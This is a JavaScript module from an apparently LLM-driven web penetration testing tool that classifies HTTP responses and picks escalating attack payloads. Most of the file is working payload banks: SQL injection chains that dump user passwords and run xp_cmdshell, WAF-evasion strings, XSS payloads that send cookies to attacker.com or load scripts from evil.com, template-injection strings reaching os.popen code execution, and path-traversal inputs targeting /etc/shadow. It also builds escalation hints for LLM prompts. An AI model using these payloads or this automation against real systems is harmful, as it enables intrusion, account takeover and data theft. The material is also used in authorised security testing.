/**
 * adaptivePayloads.js — RedVapt Adaptive Payload Engine (v3)
 *
 * Full business-impact upgrade. This module:
 *   1. Deeply classifies every HTTP response (DB type, WAF, XSS context,
 *      blind signals, timing …)
 *   2. Generates the next-best payload set based on accumulated evidence
 *      (like a senior pentester escalating based on what they observe)
 *   3. Deduplicates against already-tried payloads so we never repeat
 *
 * v3 changes:
 *   - XSS payloads now include business-impact (cookie-steal, domain-leak) variants
 *   - SQLi banks expanded with full UNION chain, info_schema enumeration, file-read
 *   - All DB-specific banks include progressive escalation: probe → extract → RCE
 *
 * Exported API:
 *   classifyResponse(body, status, headers)   → string[] of hint codes
 *   generateAdaptivePayloads(vulnType, hints, previousPayloads)  → string[]
 *   buildAdaptiveContext(responseHistory)      → { hints: string[], summary: string }
 */

// ── Classification patterns ───────────────────────────────────────────────────

const CLASSIFIERS = {
    // SQL error fingerprints
    MYSQL_DRIVEN: /error in your SQL syntax|mysql_fetch|Warning: mysql_|You have an error in your SQL|supplied argument is not a valid MySQL/i,
    POSTGRES_DRIVEN: /PostgreSQL.*ERROR|unterminated quoted string|pg_query\(\)|ERROR:.*syntax error at or near/i,
    MSSQL_DRIVEN: /Microsoft OLE DB|Unclosed quotation mark|Microsoft.*ODBC|SqlException|System\.Data\.SqlClient/i,
    SQLITE_DRIVEN: /sqlite3?\.[^:]+:|SQLITE_ERROR|no such table|near ".*": syntax error/i,
    ORACLE_DRIVEN: /ORA-\d{5}|oracle\.jdbc|quoted string not properly terminated/i,
    GENERIC_SQL_ERROR: /SQLSTATE\[|sql syntax|database error|SQL command not properly ended|invalid query/i,

    // WAF / security product fingerprints
    WAF_CLOUDFLARE: /cloudflare|cf-ray|__cfduid/i,
    WAF_INCAPSULA: /incapsula|visitorId=|reese84|rbzid/i,
    WAF_MODSECURITY: /modsecurity|406 not acceptable|mod_security/i,
    WAF_AKAMAI: /akamai|ak_bmsc|bm_sz/i,
    WAF_GENERIC: /blocked|forbidden|access denied|security policy|your request was rejected/i,
    WAF_TRIGGERED: /blocked|forbidden|access denied|cloudflare|incapsula|modsecurity|akamai|imperva|sucuri/i,

    // XSS reflection contexts
    XSS_REFLECTED_RAW: /<script[^>]*>.*?<\/script>/i,
    XSS_REFLECTED_ATTR: /onerror\s*=|onload\s*=|onclick\s*=|onfocus\s*=|ontoggle\s*=|onmouseover\s*=/i,
    XSS_REFLECTED_JS: /javascript:|vbscript:|data:text\/html/i,
    XSS_ANGLE_BRACKETS: /[<>](?!(?:html|head|body|div|span|p|br|a|img|script|style|link|meta|form|input|button|table|tr|td|th|ul|li|select|option)[^a-z])/i,

    // SSTI confirmation
    SSTI_MATH_CONFIRMED: /\b49\b/,   // 7*7 = 49
    SSTI_ENGINE_LEAK: /Jinja2|Twig|Freemarker|Velocity|Pebble|Smarty|Mako|Nunjucks/i,
    SSTI_DEBUG_LEAK: /uid=\d+|root:.*:0:0|<Config|__class__|__mro__/,

    // LFI / Path Traversal indicators
    LFI_BASIC: /root:x:0:0:|root:.*:0:0:|daemon:x:\d+:\d+:|nobody:x:\d+:\d+:|www-data:x:\d+:\d+:/,
    LFI_PARTIAL: /No such file or directory|failed to open stream|include_path|Warning:.*include|Warning:.*require|Warning:.*file_get_contents|Warning:.*fopen|java\.io\.FileNotFoundException|ENOENT/i,
    LFI_WINDOWS: /\[boot loader\]|\[fonts\]|\[extensions\]|; for 16-bit app support/i,
    LFI_PROC: /Linux version \d+\.\d+|DOCUMENT_ROOT=|SERVER_SOFTWARE=|PATH=\//,

    // Timing / blind
    TIMING_ANOMALY: null, // handled programmatically

    // App-level error → possible injection point
    SERVER_ERROR_500: null, // handled programmatically (status check)
    LENGTH_ANOMALY: null, // handled programmatically (diff check)
};

// ── Adaptive payload banks ────────────────────────────────────────────────────

const ADAPTIVE_PAYLOADS = {
    // ─ MySQL adaptive chain ─
    MYSQL_DRIVEN: {
        sqli: [
            // Column count
            "' ORDER BY 1-- -",
            "' ORDER BY 2-- -",
            "' ORDER BY 3-- -",
            "' ORDER BY 4-- -",
            // Reflective column discovery
            "-1 UNION SELECT 1,2,3-- -",
            "-1 UNION SELECT 1,2-- -",
            // DB fingerprint
            "' UNION SELECT NULL, user(), version()-- -",
            "' UNION SELECT NULL, database(), NULL-- -",
            // Table enumeration
            "' UNION SELECT NULL, GROUP_CONCAT(table_name SEPARATOR ','), NULL FROM information_schema.tables WHERE table_schema=database()-- -",
            "' UNION SELECT NULL, GROUP_CONCAT(schema_name), NULL FROM information_schema.schemata-- -",
            // Column enumeration (users table)
            "' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='users'-- -",
            "' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='accounts'-- -",
            // Data extraction
            "' UNION SELECT NULL, GROUP_CONCAT(username,0x3a,password), NULL FROM users-- -",
            "' UNION SELECT NULL, GROUP_CONCAT(email,0x3a,password), NULL FROM users-- -",
            // Privilege check
            "' UNION SELECT ALL 1,2,GROUP_CONCAT(privilege_type) FROM INFORMATION_SCHEMA.USER_PRIVILEGES-- -",
            // File read (if FILE priv)
            "' UNION SELECT NULL, load_file('/etc/passwd'), NULL-- -",
            "' UNION SELECT NULL, load_file(0x2f6574632f706173737764), NULL-- -",
            // Time-based blind
            "' OR SLEEP(5)-- -",
            "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -",
            // Error-based
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -",
            "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- -",
        ],
    },
    POSTGRES_DRIVEN: {
        sqli: [
            // Time-based blind
            "'; SELECT pg_sleep(5)--",
            "' AND 1=1 AND (SELECT pg_sleep(5))--",
            // DB fingerprint
            "' UNION SELECT NULL, current_user, NULL--",
            "' UNION SELECT NULL, version(), NULL--",
            "' UNION SELECT NULL, current_database(), NULL--",
            // Table enumeration
            "' UNION SELECT NULL, string_agg(table_name,','), NULL FROM information_schema.tables WHERE table_schema='public'--",
            // Column enumeration
            "' UNION SELECT NULL, string_agg(column_name,','), NULL FROM information_schema.columns WHERE table_name='users'--",
            // Data extraction
            "' UNION SELECT NULL, string_agg(username||':'||password,','), NULL FROM users--",
            // Error-based casting
            "'; SELECT NULL WHERE 1=CAST((SELECT current_database()) AS INT)--",
            "' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS INT)--",
            "' OR 1=1::int--",
        ],
    },
    MSSQL_DRIVEN: {
        sqli: [
            // Time-based blind
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND 1=1; WAITFOR DELAY '0:0:5'--",
            // DB fingerprint
            "' UNION SELECT NULL, @@version, NULL--",
            "' UNION SELECT NULL, system_user, NULL--",
            "' UNION SELECT NULL, DB_NAME(), NULL--",
            // Table enumeration
            "' UNION SELECT NULL, STRING_AGG(table_name,','), NULL FROM information_schema.tables--",
            // RCE attempt
            "'; EXEC xp_cmdshell('whoami')--",
            "'; EXEC xp_cmdshell('type C:\\Windows\\System32\\drivers\\etc\\hosts')--",
            // Error-based
            "' AND 1=CONVERT(INT,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' OR 1=1--",
        ],
    },
    ORACLE_DRIVEN: {
        sqli: [
            // DB fingerprint
            "' UNION SELECT NULL, user, NULL FROM dual--",
            "' UNION SELECT NULL, banner, NULL FROM v$version--",
            "' UNION SELECT NULL, global_name, NULL FROM global_name--",
            // Table enumeration
            "' UNION SELECT NULL, LISTAGG(table_name,','), NULL FROM all_tables--",
            // Time-based blind
            "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) FROM dual--",
            "' OR 1=1--",
        ],
    },
    SQLITE_DRIVEN: {
        sqli: [
            // DB fingerprint
            "' UNION SELECT NULL, sqlite_version(), NULL--",
            // Table enumeration
            "' UNION SELECT NULL, GROUP_CONCAT(name,','), NULL FROM sqlite_master WHERE type='table'--",
            // Column enumeration (need table name first)
            "' UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' LIMIT 1--",
            // Heavy load (time-based DoS for blind)
            "1; SELECT randomblob(100000000)--",
            "' OR 1=1--",
        ],
    },
    GENERIC_SQL_ERROR: {
        sqli: [
            // Error probe
            "'",
            "''",
            "' OR '",
            // Auth bypass
            "' OR 1=1--",
            "' OR '1'='1",
            "' OR 1=1#",
            // Column count
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            // UNION probe
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "-1 UNION SELECT 1,2,3--",
            "1; SELECT 1--",
            "1' AND 1=1-- -",
        ],
    },

    // ─ WAF evasion escalations ─
    WAF_TRIGGERED: {
        sqli: [
            "1' /*!50000AND*/ 1=1-- -",
            "1' %09AND%09 1=1-- -",
            "1' AND/**/1=1-- -",
            "1'%0aAND%0a1=1-- -",
            "1' /*!AND*/ /*!1=1*/-- -",
            "1' UNION%23%0ASELECT NULL-- -",
            "1' UNION%0ASELECT%0ANULL-- -",
            "-1'+UNION+SELECT+NULL,NULL,NULL--+-",
        ],
        xss: [
            '<svg/onload=alert`1`>',
            '"><svg onload=alert(1)>',
            '<img src=1 onerror=alert(1)>',
            '"-alert(document.cookie)-"',
            "';alert(document.cookie)//",
            '</script><script>alert(document.cookie)</script>',
            '&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(document.cookie)&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;',
            '%3Cscript%3Ealert(document.cookie)%3C/script%3E',
            // Cookie-steal through WAF evasion
            '<img src=x onerror=fetch(`//attacker.com/?c=`+btoa(document.cookie))>',
        ],
        ssti: [
            '{%25 7*7 %25}',
            '{{7*7}}<!--',
            '${7*7}<!--',
            '%7B%7B7*7%7D%7D',
            '&#123;&#123;7*7&#125;&#125;',
        ],
        lfi: [
            // Double URL-encoding (bypasses single-decode WAFs)
            '..%252f..%252f..%252f..%252fetc%252fpasswd',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            // UTF-8 overlong encoding (bypasses regex filters)
            '..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
            // Null byte truncation
            '../../../../etc/passwd%00',
            '../../../../etc/passwd%00.html',
            // Recursive strip bypass
            '....//....//....//....//etc/passwd',
            '..././..././..././..././etc/passwd',
            // Tomcat/Java path param
            '..;/..;/..;/..;/etc/passwd',
            // PHP wrapper chain
            'php://filter/convert.base64-encode/resource=/etc/passwd',
        ],
    },

    // ─ XSS context escalations — with business-impact payloads ─
    XSS_REFLECTED_RAW: {
        xss: [
            '<script>alert(TOKEN)</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<script>fetch("//attacker.com/c?d="+document.domain+"&c="+btoa(document.cookie))</script>',
            '<img src=x onerror="fetch(\'//attacker.com/?c=\'+btoa(document.cookie))">',
            '<script src=//evil.com/x.js></script>',
            '<script>document.location="http://attacker.com/?c="+document.cookie</script>',
        ],
    },
    XSS_REFLECTED_ATTR: {
        xss: [
            '" onmouseover="alert(TOKEN)"',
            '" onfocus="alert(TOKEN)" autofocus="',
            "' onerror='alert(TOKEN)'",
            '"><img src=x onerror=alert(TOKEN)>',
            '" onload="alert(TOKEN)',
            '" onanimationstart="alert(TOKEN)" style="animation:x"',
            // Business impact
            '" onmouseover="alert(document.cookie)"',
            '" onfocus="fetch(\'//attacker.com/?c=\'+btoa(document.cookie))" autofocus="',
            '"><script>alert(document.domain+"\n"+document.cookie)</script>',
        ],
    },
    XSS_REFLECTED_JS: {
        xss: [
            "';alert(TOKEN)//",
            '";alert(TOKEN)//',
            '`-alert(TOKEN)-`',
            '\\"alert(TOKEN)//',
            "');alert(TOKEN)//",
            "javascript:alert(TOKEN)",
            // Business impact
            "';alert(document.cookie)//",
            '";fetch("//attacker.com/?c="+btoa(document.cookie))//',
            "';document.location='//attacker.com/?c='+btoa(document.cookie)//",
            "javascript:alert(document.cookie)",
        ],
    },

    // ─ SSTI escalations ─
    SSTI_MATH_CONFIRMED: {
        ssti: [
            '{{config}}',
            '{{self.__class__.__mro__}}',
            "{{''.__class__.mro()[1].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            '${T(java.lang.Runtime).getRuntime().exec("id")}',
            '{{7*7}}{{config.items()}}',
            '{% for x in [].class.base.subclasses() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__["__import__"]("os").popen("id").read()}}{% endif %}{% endfor %}',
        ],
    },
    SSTI_ENGINE_LEAK: {
        ssti: [
            '{{config.SECRET_KEY}}',
            '{{config.DATABASE_URL}}',
            '{{request.environ}}',
            '<%= system("id") %>',
            '#{ "id".strip }',
        ],
    },

    // ─ Blind / anomaly escalations ─
    LENGTH_ANOMALY: {
        sqli: [
            "' AND 1=1-- -",
            "' AND 1=2-- -",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "1 AND 1=1",
            "1 AND 1=2",
            // Boolean-based extraction
            "' AND SUBSTRING(database(),1,1)='a",
            "' AND SUBSTRING(database(),1,1)='b",
            "' AND LENGTH(database())>5-- -",
        ],
    },
    SERVER_ERROR_500: {
        sqli: [
            "' OR 1=1--",
            "''",
            "'\"",
            "1;",
            "1--",
            "1' UNION SELECT NULL--",
            // Trigger more specific errors
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        ssti: [
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '<%= 7*7 %>',
        ],
    },

    // ─ LFI adaptive escalation ─
    LFI_BASIC: {
        lfi: [
            // Confirmed file read → escalate to sensitive files
            '/etc/shadow',
            '/etc/hosts',
            '/proc/self/environ',
            '/proc/version',
            '/proc/self/cmdline',
            '/proc/self/status',
            '/proc/self/mounts',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/var/log/auth.log',
            // PHP wrappers for RCE escalation (HackTricks LFI-to-RCE)
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=config.php',
            'expect://id',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==',
            // Windows escalation
            '..\\..\\..\\..\\windows\\win.ini',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
        ],
    },
    LFI_PARTIAL: {
        lfi: [
            // Path error disclosed → try deeper traversal and encoding bypasses
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            // Null-byte bypass
            '../../../../etc/passwd%00',
            '../../../../etc/passwd%00.html',
            '../../../../etc/passwd%00.php',
            // Double encoding
            '..%252f..%252f..%252f..%252fetc%252fpasswd',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            // Filter bypass
            '....//....//....//....//etc/passwd',
            '..././..././..././..././etc/passwd',
            '..;/..;/..;/..;/etc/passwd',
            // UTF-8 overlong
            '..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
        ],
    },
    LFI_WINDOWS: {
        lfi: [
            '..\\..\\..\\..\\..\\windows\\win.ini',
            '..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini',
            '..%255c..%255c..%255c..%255cwindows%255cwin.ini',
            'C:\\boot.ini',
            'C:\\windows\\win.ini',
            '....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini',
        ],
    },
};

// ── classifyResponse ──────────────────────────────────────────────────────────

/**
 * Classify an HTTP response and return an array of hint codes.
 *
 * @param {string}  body        - Response body text
 * @param {number}  status      - HTTP status code
 * @param {object}  headers     - Response headers object
 * @param {object}  [options]   - { baselineLength?, requestDurationMs? }
 * @returns {string[]}          - Array of hint codes (e.g. ['MYSQL_DRIVEN', 'WAF_TRIGGERED'])
 */
export function classifyResponse(body = '', status = 200, headers = {}, options = {}) {
    const hits = new Set();
    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
    const headerStr = JSON.stringify(headers).toLowerCase();

    // Run all regex classifiers
    for (const [code, pattern] of Object.entries(CLASSIFIERS)) {
        if (pattern instanceof RegExp) {
            if (pattern.test(bodyStr) || pattern.test(headerStr)) {
                hits.add(code);
            }
        }
    }

    // Programmatic checks
    if (status === 500 || status === 503) hits.add('SERVER_ERROR_500');

    if (status === 403 || status === 406 || status === 429) hits.add('WAF_TRIGGERED');

    // Timing anomaly (caller must provide baselineLength if available)
    if (options.requestDurationMs && options.requestDurationMs > 4000) {
        hits.add('TIMING_ANOMALY');
    }

    // Length anomaly (significant deviation from baseline suggests boolean blind)
    if (options.baselineLength && bodyStr.length > 0) {
        const ratio = Math.abs(bodyStr.length - options.baselineLength) / options.baselineLength;
        if (ratio > 0.3) {
            hits.add('LENGTH_ANOMALY');
        }
    }

    // Consolidate WAF codes into single WAF_TRIGGERED
    const wafCodes = ['WAF_CLOUDFLARE', 'WAF_INCAPSULA', 'WAF_MODSECURITY', 'WAF_AKAMAI', 'WAF_GENERIC'];
    if (wafCodes.some(c => hits.has(c))) {
        hits.add('WAF_TRIGGERED');
    }

    return [...hits];
}

// ── generateAdaptivePayloads ──────────────────────────────────────────────────

/**
 * Generate the next batch of payloads for a given vuln type based on what
 * was learned from previous responses. Deduplicates against already-tried
 * payloads so we never repeat.
 *
 * @param {string}   vulnType          - 'xss' | 'sqli' | 'ssti'
 * @param {string[]} contextHints      - Hint codes from classifyResponse()
 * @param {string[]} [previousPayloads] - Already-attempted payloads (dedup)
 * @param {string}   [proofToken]       - Token to embed in XSS payloads
 * @param {number}   [maxPayloads=8]    - Max payloads to return
 * @returns {string[]}
 */
export function generateAdaptivePayloads(
    vulnType,
    contextHints = [],
    previousPayloads = [],
    proofToken = 'TOKEN',
    maxPayloads = 8
) {
    const vt = vulnType.toLowerCase().replace('sql injection', 'sqli').replace('sql', 'sqli');
    const tried = new Set(previousPayloads.map(p => p.toLowerCase().trim()));
    const candidates = [];

    // Ordered priority: most specific hints first
    const HINT_PRIORITY = [
        'LFI_BASIC', 'LFI_PARTIAL', 'LFI_WINDOWS', 'LFI_PROC',
        'SSTI_MATH_CONFIRMED', 'SSTI_ENGINE_LEAK', 'SSTI_DEBUG_LEAK',
        'MYSQL_DRIVEN', 'POSTGRES_DRIVEN', 'MSSQL_DRIVEN', 'ORACLE_DRIVEN', 'SQLITE_DRIVEN',
        'XSS_REFLECTED_JS', 'XSS_REFLECTED_ATTR', 'XSS_REFLECTED_RAW',
        'WAF_TRIGGERED',
        'LENGTH_ANOMALY', 'SERVER_ERROR_500', 'GENERIC_SQL_ERROR',
        'TIMING_ANOMALY',
    ];

    for (const hint of HINT_PRIORITY) {
        if (!contextHints.includes(hint)) continue;
        const bank = ADAPTIVE_PAYLOADS[hint];
        if (!bank) continue;

        // Get payloads for the current vuln type (or any type if hint is generic)
        const pool = bank[vt] || bank['sqli'] || bank['xss'] || bank['ssti'] || [];
        for (const p of pool) {
            const withToken = p.replace(/TOKEN/g, proofToken);
            if (!tried.has(withToken.toLowerCase().trim())) {
                candidates.push(withToken);
            }
        }
    }

    // Remove duplicates within candidates
    const unique = [...new Set(candidates)];
    return unique.slice(0, maxPayloads);
}

// ── buildAdaptiveContext ──────────────────────────────────────────────────────

/**
 * Aggregate hints from multiple response classifications into a context
 * object suitable for passing to LLM prompts.
 *
 * @param {Array<{ body, status, headers, durationMs?, baselineLength? }>} responseHistory
 * @returns {{ hints: string[], summary: string }}
 */
export function buildAdaptiveContext(responseHistory = []) {
    const allHints = new Set();

    for (const r of responseHistory) {
        const hints = classifyResponse(
            r.body || '',
            r.status || 200,
            r.headers || {},
            { requestDurationMs: r.durationMs, baselineLength: r.baselineLength }
        );
        hints.forEach(h => allHints.add(h));
    }

    const hints = [...allHints];

    // Build a human-readable summary for LLM context
    const lines = [];
    if (hints.some(h => h.includes('MYSQL'))) lines.push('MySQL confirmed — use UNION SELECT, SLEEP(5), information_schema, LOAD_FILE payloads');
    if (hints.some(h => h.includes('POSTGRES'))) lines.push('PostgreSQL confirmed — use pg_sleep, ::text casts, string_agg');
    if (hints.some(h => h.includes('MSSQL'))) lines.push('MSSQL confirmed — use WAITFOR DELAY, @@version, xp_cmdshell');
    if (hints.some(h => h.includes('ORACLE'))) lines.push('Oracle DB confirmed — use dual table, DBMS_PIPE');
    if (hints.some(h => h.includes('SQLITE'))) lines.push('SQLite confirmed — use sqlite_master table');
    if (hints.includes('WAF_TRIGGERED')) lines.push('WAF detected — use comment/encoding evasion (/**/, %0a, /*!*/)');
    if (hints.includes('SSTI_MATH_CONFIRMED')) lines.push('SSTI math eval confirmed (49) — escalate to RCE chain');
    if (hints.includes('XSS_REFLECTED_JS')) lines.push('XSS reflected inside JS context — break out of string');
    if (hints.includes('XSS_REFLECTED_ATTR')) lines.push('XSS reflected in HTML attribute — use event handlers');
    if (hints.includes('XSS_REFLECTED_RAW')) lines.push('XSS reflected raw in HTML — direct script injection');
    if (hints.includes('LFI_BASIC')) lines.push('LFI confirmed (/etc/passwd read) — escalate to /etc/shadow, /proc/self/environ, log files, PHP wrappers for RCE');
    if (hints.includes('LFI_PARTIAL')) lines.push('LFI partial signal (path error disclosed) — try deeper traversal depths, encoding bypasses, null-byte truncation');
    if (hints.includes('LFI_WINDOWS')) lines.push('Windows LFI confirmed — try win.ini, boot.ini, hosts file, SAM database');
    if (hints.includes('LFI_PROC')) lines.push('Linux /proc file read confirmed — extract environ, cmdline, status for server intelligence');
    if (hints.includes('LENGTH_ANOMALY')) lines.push('Boolean-based blind signal — response length changes with conditions → try ORDER BY enumeration');
    if (hints.includes('TIMING_ANOMALY')) lines.push('Timing anomaly — possible time-based blind injection (SLEEP/WAITFOR)');
    if (hints.includes('SERVER_ERROR_500')) lines.push('500 error triggered — server does not sanitize input → escalate with UNION probes');
    if (hints.includes('GENERIC_SQL_ERROR')) lines.push('Generic SQL error — probe further with ORDER BY and UNION SELECT chains');

    return {
        hints,
        summary: lines.length > 0
            ? `Adaptive intelligence:\n${lines.map(l => `  • ${l}`).join('\n')}`
            : 'No strong signals yet — continue with baseline payloads',
    };
}
